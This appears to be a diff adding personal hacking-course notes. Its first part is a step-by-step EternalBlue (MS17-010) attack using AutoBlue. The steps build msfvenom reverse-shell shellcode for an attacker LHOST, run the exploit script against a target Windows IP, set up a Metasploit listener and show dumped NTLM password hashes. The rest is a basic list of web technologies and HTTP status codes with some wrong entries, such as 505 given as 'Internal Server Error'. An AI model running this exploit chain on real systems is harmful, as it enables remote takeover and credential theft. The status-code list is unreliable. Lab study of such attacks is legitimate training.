@@ -1,0 +1,133 @@
+https://github.com/3ndG4me/AutoBlue-MS17-010
+copy git link 
+
+https://github.com/3ndG4me/AutoBlue-MS17-010.git
+  Open New Terminal on Desktop
+  mkdir tools
+cd tools
+git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
+
+
+ cd AutoBlue-MS17-010
+ cd shellcode
+ ./shell_prep.sh
+ Answer Questions to build the payload
+ yes to build payload using msfvenom
+ select pyload type using 1
+ SET LHOST IP    Kali Linux IP
+ set LPORT  for x64 and x86 as 4445
+========================================================
+cd ..
+AutoBlue-MS17-010$ chmod 777  eternalblue_exploit7.py
+./eternalblue_exploit7.py 192.168.0.106(Target Windows IP) ./shellcode/sc_x86.bin
+
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+Note:
+ befor press enter 
+ go to msfconsole
+    use exploit/multi/handler
+   set lhost Kali Linux IP
+   set lport 4445
+  exploit -z 
+
+=========================================================================
+ Web Service
+
+ WEB Server
+
+ WEB Application 
+ Apache
+  IIS
+ NGINX
+ WebSite:
+   BackEnd
+      DB , API's , Source Code
+   DB:
+	Oracle
+  MSSQL 
+  MySQL
+  mongoDB
+  postgresql
+  
+Web Site Backend Programing Languages
+    PHP
+    Python
+  ASP.NET MVC
+  ASP.NET Core
+  JAVA WEB
+  NODE.JS
+  Front End Languages
+  HTML 
+ CSS
+ Javascript
+ JQUERY
+ REACT
+ Bootstrap
+ Angular
+
+==================================================
+    HTTP 
+
+   Request
+GET /login.php HTTP/1.1
+
+Response
+  Page Content 
+
+
+HTTP 
+Methods
+REQUEST 
+ GET
+POST
+PUT
+DELETE
+
+  Response CODES
+100-199 - Information Response
+200-299 - Success 
+
+300-399 - Redirection 
+400-499 - Client Errors
+500-599 - Server Errors
+200 - OK
+201 - Created 
+301 - Permanent Redirect
+302 - Temporary Redirect
+400 - Bad Request
+401 - Not Authorised
+403 - Forbidden
+404 - Page Not Found
+405 - Method Not Allowed
+500 - Internal Service Error
+503 - Service Unavailable
+505 - Internal Server Error
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
